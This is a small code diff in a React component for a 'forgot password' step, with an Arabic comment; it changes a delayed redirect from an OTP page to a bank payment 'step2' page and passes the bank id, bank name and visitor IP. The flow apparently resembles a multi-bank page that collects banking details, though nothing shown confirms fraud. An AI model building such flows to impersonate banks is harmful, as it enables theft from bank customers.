@@ -152,7 +152,7 @@ function ForgotPasswordContent() {
     // التوجيه إلى صفحة OTP بعد 2 ثانية
     setTimeout(() => {
       setIsLoading(false);
-      router.push(`/otp?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip)}`);
+      router.push(`/payment/banks/bankaz/step2?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip)}`);
     }, 2000);
   };
 
